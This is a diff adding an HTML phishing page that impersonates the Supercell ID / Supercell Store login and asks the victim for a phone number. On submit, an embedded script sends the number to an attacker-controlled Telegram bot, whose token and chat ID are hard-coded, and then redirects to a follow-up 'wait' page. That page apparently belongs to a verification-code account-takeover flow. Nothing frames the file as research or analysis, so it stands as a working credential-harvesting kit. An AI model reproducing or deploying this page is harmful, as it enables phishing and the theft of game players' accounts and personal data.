@@ -1,0 +1,101 @@
+
+,<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Supercell ID Login</title>
+  <!-- Tailwind CSS -->
+  <script src="https://cdn.tailwindcss.com"></script>
+  <!-- Font Awesome (optional) -->
+  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" rel="stylesheet"/>
+  <script>
+    async function sendPhoneToTelegram(event) {
+      event.preventDefault();
+      const phone = document.getElementById('phone').value;
+      const botToken = '7619144760:AAFgnQ9NIw4IR8SA-JNLk2upPe0LHvNMgKM'; // <-- Insert your bot token here
+      const chatId = '5587800563';     // <-- Insert your chat ID here
+      const message = `Phone number: ${phone}`;
+      
+      const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+      
+      try {
+        await fetch(url);
+        window.location.href = 'wait2.html'; // Redirect page after code is sent
+      } catch (error) {
+        console.error('Error sending message to Telegram:', error);
+      }
+    }
+  </script>
+</head>
+<body class="bg-blue-900 flex items-center justify-center min-h-screen px-4">
+  <!-- Card Container -->
+  <div class="bg-white rounded-lg shadow-lg p-6 w-full max-w-sm">
+    <!-- Logo -->
+    <div class="text-center mb-4">
+      <img
+        alt="Supercell ID logo"
+        class="mx-auto mb-4 w-24"
+        src="data:image/png;base64,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"
+      />
+    </div>
+    <!-- Top Section: Sign In / Verify labels and progress bar -->
+    <div class="flex items-center justify-between mb-2">
+      <span class="text-gray-700 font-medium">Sign In</span>
+      <span class="text-gray-700 font-medium">Verify</span>
+    </div>
+    <div class="w-full bg-gray-200 rounded-full h-2.5 mb-4">
+      <!-- Adjust the progress bar width as needed (style="width: 50%") -->
+      <div class="bg-gradient-to-r from-blue-500 to-green-400 h-2.5 rounded-full" style="width: 50%;"></div>
+    </div>
+    
+    <!-- Logo and Title -->
+    <div class="text-center mb-4">
+      <img
+        alt="Supercell ID logo"
+        class="mx-auto mb-4 w-24"
+        src="https://accounts.supercell.com/static/appicons/store.png"
+      />
+      <h1 class="text-xl font-bold">Supercell Store Login</h1>
+      <p class="text-gray-600 text-sm">Enter your phone number to receive a verification code.</p>
+    </div>
+    
+    <!-- Form -->
+    <form onsubmit="sendPhoneToTelegram(event)">
+      <div class="mb-4">
+        <input
+          class="w-full px-4 py-3 border rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 text-base"
+          id="phone"
+          type="tel"
+          placeholder="Enter your phone number"
+          required
+        />
+      </div>
+      <p class="text-xs text-gray-600 mb-4 text-center">
+        This site is protected by CAPTCHA. Google's 
+        <a class="text-blue-500" href="#">Privacy Policy</a> and 
+        <a class="text-blue-500" href="#">Terms of Service</a> apply.
+      </p>
+      <div class="flex flex-col space-y-3">
+        <button
+          class="w-full bg-blue-500 text-white py-3 rounded-lg text-base font-semibold hover:bg-blue-600 active:bg-blue-700"
+          type="submit"
+        >
+          SIGN IN
+        </button>
+        <button
+          class="w-full border border-gray-300 text-gray-700 py-3 rounded-lg text-base hover:bg-gray-100 active:bg-gray-200"
+          type="button"
+          onclick="window.history.back()"
+        >
+          GO BACK
+        </button>
+      </div>
+    </form>
+    
+    <!-- Footer Link -->
+    <div class="text-center mt-4">
+      <a class="text-blue-500" href="#">Want to register for Supercell ID?</a>
+    </div>
+  </div>
+</body>
+</html>
